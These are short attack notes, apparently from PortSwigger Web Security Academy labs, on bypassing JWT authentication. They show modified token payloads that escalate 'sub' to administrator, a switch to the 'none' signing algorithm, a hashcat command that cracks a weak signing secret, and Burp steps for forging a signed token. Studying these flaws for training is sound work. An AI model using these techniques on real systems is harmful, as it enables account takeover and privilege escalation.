[+] JWT Attacks
==============================================================================

# 1. JWT authentication bypass via unverified signature
# Use "Json Web Token extension"
# Change or modify manually the sub variables to escalate privileges

# original payload:
{
    "iss": "123465",
    "sub": "Costumer",
    "exp": 1660653822
}
# Change Sub variable by Administrator
{
    "iss": "123465",
    "sub": "Administrator",
    "exp": 1660653822
}

# 2. JWT authentication bypass via flawed signature verification
# Use "Json Web Token extension"
# On attack button select '"none" Signing Algorithm'
# Change or modify manually the sub variables to escalate privileges

# original payload:
{
    "kid": "fb292028-1634-416f-a76e-0e842abc8fa9",
    "alg": "RS256"
}
{
    "iss": "123465",
    "sub": "Costumer",
    "exp": 1660653822
}
# changed payload:
{
    "typ": "JWT",
    "alg": "none"
}
{
    "iss": "portswigger",
    "sub": "administrator",
    "exp": 1660654482
}
# 3. JWT authentication bypass via weak signing key

hashcat -a 0 -m 16500 eyJraWQiOiJhODBlZmVkMi0zNmU... /usr/share/wordlists/rockyou.txt
# Once the hashcat exope the password:

# Generate a forged signing key
# Using Burp Decoder, Base64 encode the secret that you brute-forced in the previous section.
# In Burp, go to the JWT Editor Keys tab and click New Symmetric Key. In the dialog, click Generate to generate a new key in JWK format. Note that you don't need to select a key size as this will automatically be updated later.
# Replace the generated value for the k property with the Base64-encoded secret.
# Click OK to save the key.
# capture the trafic and modufy the JWT in the request
# At the bottom of the tab, click Sign, then select the key that you generated in the previous section.
# Make sure that the Don't modify header option is selected, then click OK. The modified token is now signed with the correct signature.
# Send the request and observe that you have successfully accessed the other user.
